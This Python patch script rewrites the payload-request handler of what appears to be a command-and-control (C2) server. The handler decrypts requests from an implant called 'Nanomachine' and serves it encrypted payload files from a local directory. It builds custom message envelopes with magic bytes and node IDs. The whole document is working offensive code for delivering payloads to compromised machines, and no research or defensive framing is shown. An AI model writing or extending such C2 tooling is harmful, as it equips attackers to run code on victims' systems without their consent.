import re

with open("c2_server/server.py", "r") as f:
    content = f.read()

# Replace the handle stage req missing logic
new_logic = r"""
    def _handle_payload_req(self, data):
        \"\"\"Handle a payload module request from the Nanomachine.\"\"\"
        client_ip = self.client_address[0]
        env, ct = parse_envelope(data)

        short_id = "unknown"
        if env:
            short_id = env["node_id_hex"][:8]

        log_print(f"[⬇] Payload request from {short_id} ({client_ip})", Colors.BLUE)

        # Decrypt the incoming request to keep crypto state in sync
        if env and ct:
            aad_env = bytearray(data[:ENVELOPE_SIZE])
            aad_env[16:28] = b'\x00' * 12  # zero IV for AAD
            aad_env[28:44] = b'\x00' * 16  # zero tag for AAD
            try:
                SERVER_CRYPTO.decrypt(ct, env["iv"], env["tag"], bytes(aad_env))
            except Exception as e:
                log_print(f"  └─ Failed to decrypt payload request: {e}", Colors.FAIL)

        # Check for a default payload in the payloads directory
        payloads_dir = os.path.join(PROJECT_ROOT, "payloads")
        if os.path.exists(payloads_dir):
            payloads = os.listdir(payloads_dir)
            if payloads:
                # Return the first available payload
                ppath = os.path.join(payloads_dir, payloads[0])
                with open(ppath, "rb") as f:
                    payload_data = f.read()
                log_print(f"  └─ Serving payload: {payloads[0]} ({len(payload_data)} bytes)", Colors.GREEN)

                # Encrypt the payload data
                seq = SERVER_CRYPTO.total_messages
                node_id_bytes = bytes.fromhex(env["node_id_hex"]) if env else b'\x00' * 16

                aad_env_resp = struct.pack(
                    ENVELOPE_FMT,
                    C2_MAGIC,
                    C2_MSG_PAYLOAD_DATA,  # Send as payload data
                    len(payload_data),
                    seq,
                    b'\x00' * 12,
                    b'\x00' * 16,
                    node_id_bytes
                )

                ciphertext, iv, tag = SERVER_CRYPTO.encrypt(payload_data, aad_env_resp)

                env_bytes = struct.pack(
                    ENVELOPE_FMT,
                    C2_MAGIC,
                    C2_MSG_PAYLOAD_DATA,
                    len(ciphertext),
                    seq,
                    iv,
                    tag,
                    node_id_bytes
                )

                log_print(f"  └─ Encrypted payload ({len(ciphertext)} bytes)", Colors.GREEN)
                return env_bytes + ciphertext

        log_print(f"  └─ No payloads available", Colors.FAIL)
        return b""
"""

# Find the old _handle_payload_req
pattern = re.compile(r'    def _handle_payload_req\(self, data\):.*?return b""\n', re.DOTALL)

# Need to replace the backslashes so re.sub doesn't interpret them as escapes
new_logic_sub = new_logic.strip().replace('\\', '\\\\')

new_content = pattern.sub(new_logic_sub + "\n", content)

with open("c2_server/server.py", "w") as f:
    f.write(new_content)
print("Patch applied.")
